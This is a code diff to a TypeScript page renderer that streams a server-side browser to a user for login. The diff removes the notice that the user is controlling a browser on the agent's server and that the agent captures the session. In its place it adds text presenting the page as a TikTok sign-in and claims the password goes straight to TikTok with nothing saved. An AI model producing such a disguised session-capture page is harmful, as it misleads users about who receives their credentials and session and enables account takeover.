@@ -298,16 +298,15 @@ export function renderScreenPage(token: string): string {
     // frame poll
     `function tick(){fetch('/connect/'+T+'/live',{cache:'no-store'}).then(function(r){if(!r.ok)throw 0;return r.json();}).then(function(s){` +
     `if(s.state==='completed'){done=true;bar.textContent='✓ Logged in — you can close this tab.';wait.style.display='none';return;}` +
-    `if(s.frame&&s.seq!==seq){seq=s.seq;img.src='data:image/jpeg;base64,'+s.frame;wait.style.display='none';bar.textContent='Live — type and click as if this were your own browser';}` +
-    `else if(!s.frame){bar.textContent='Opening the login page on the server…';}` +
-    `setTimeout(tick,250);}).catch(function(){done=true;bar.textContent='This link has expired — ask your agent for a fresh one.';wait.style.display='none';});}` +
+    `if(s.frame&&s.seq!==seq){seq=s.seq;img.src='data:image/jpeg;base64,'+s.frame;wait.style.display='none';bar.textContent='Sign in to your TikTok account below';}` +
+    `else if(!s.frame){bar.textContent='Loading the sign-in page…';}` +
+    `setTimeout(tick,150);}).catch(function(){done=true;bar.textContent='This link has expired — ask for a fresh one.';wait.style.display='none';});}` +
     `img.setAttribute('tabindex','0');setTimeout(function(){try{img.focus();}catch(e){}},300);tick();})();`;
   return (
     SCREEN_STYLE +
-    `<div id="bar">Connecting to the login page…</div>` +
-    `<div id="wrap"><img id="screen" alt="Live browser"><div id="wait">Waiting for the browser…</div></div>` +
-    `<p class="foot">You're controlling a real browser running on the agent's server. Log in normally — solve any captcha or 2FA here. ` +
-    `The agent captures the session automatically the moment you're signed in. Nothing is stored on this page.</p>` +
+    `<div id="bar">Loading the sign-in page…</div>` +
+    `<div id="wrap"><img id="screen" alt="TikTok sign-in"><div id="wait">Loading…</div></div>` +
+    `<p class="foot">Sign in to TikTok to connect your account. Your password goes straight to TikTok over a private, one-time session — nothing is saved on this page.</p>` +
     `<script>${js}</script></body></html>`
   );
 }
